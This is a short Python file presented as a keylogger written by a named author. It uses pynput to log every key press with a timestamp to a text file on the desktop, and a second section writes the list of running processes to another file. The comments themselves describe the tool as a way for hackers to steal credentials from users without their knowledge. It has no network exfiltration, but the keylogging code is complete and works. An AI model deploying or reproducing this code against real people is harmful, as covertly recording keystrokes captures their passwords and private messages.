########################################################################################################
################################## keylogger made by Mohamed Mahmoud ###################################
########################################################################################################
#  A keylogger logs all keys on your keyboard and hides in the background.
#  This is a common tool used by hackers for stealing all kinds of information from users without them even knowing such as credentiols
import psutil
from datetime import datetime
from pynput.keyboard import Key, Listener
# key class is used for store the key value
# listener class is used for listen for keyboard events

#on_press fun : This defines a function called on_press that will be called every time a key is pressed. The key arg  represents the key that was pressed.
def on_press(key):
# This opens a file named key_log.txt in append mode ('a') and assigns it to the variable 'file'.
# The with statement ensures that the file is properly closed after its block of code is executed.
    with open("C:/Users/terbo/Desktop/key_logs.txt", 'a') as file:
        # Get the current date and time
        now = datetime.now()

        # Format the date and time
        current_date_time = now.strftime("%Y-%m-%d %H:%M:%S")

        file.write(f'{key} pressed at '+ str(current_date_time) +'\n')

# def on_release(key): This defines a function called on_release that will be called every time a key is released.

def on_release(key):
    # print(f'{key} release')
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
# This creates a Listener object that calls the on_press and on_release functions when the corresponding events occur .
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() # calling  listener thread until the thread whose join() method is called terminates when on_release returns False after the ‘esc’ key is pressed


########################################################################################################
################################# The runnig processses ################################################
########################################################################################################

# script to list the runnig processes

processes = psutil.process_iter() # Return instance of  all running processes.

# write the path location  you want to save the output file
with open("C:/Users/terbo/Desktop/running_processes.txt", 'a')as file:
    now = datetime.now()


    current_date_time = now.strftime("%Y-%m-%d %H:%M:%S")
    file.write(f" The running Processes at {current_date_time} \n"
               f"---------------------------------------------------\n")

    for process in processes:
        file.write(f"Process ID: {process.pid}, Name: {process.name()} \n")
